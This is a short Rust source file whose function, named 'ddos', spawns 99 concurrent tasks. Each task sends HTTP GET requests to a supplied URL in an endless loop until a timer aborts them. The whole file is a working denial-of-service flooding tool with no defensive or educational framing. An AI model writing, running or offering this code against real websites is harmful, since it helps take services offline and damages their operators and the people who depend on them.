use reqwest;
use std::sync::{Arc, Mutex};
use tokio::time::{sleep, Duration};

pub async fn ddos(url: String, time: Duration) {
    let mut tasks = Vec::new();

    let url = Arc::new(Mutex::new(url));

    for _ in 1..100 {
        let u = Arc::clone(&url);

        let t = tokio::spawn(async move {
            let client = reqwest::Client::new();

            let url: String = { u.lock().unwrap().clone() };

            loop {
                let _ = client.get(&url).send().await;
            }
        });

        tasks.push(t);
    }

    let _ = tokio::spawn(async move {
        sleep(time).await;

        tasks.iter().for_each(|task| {
            task.abort();
        });
    });
}
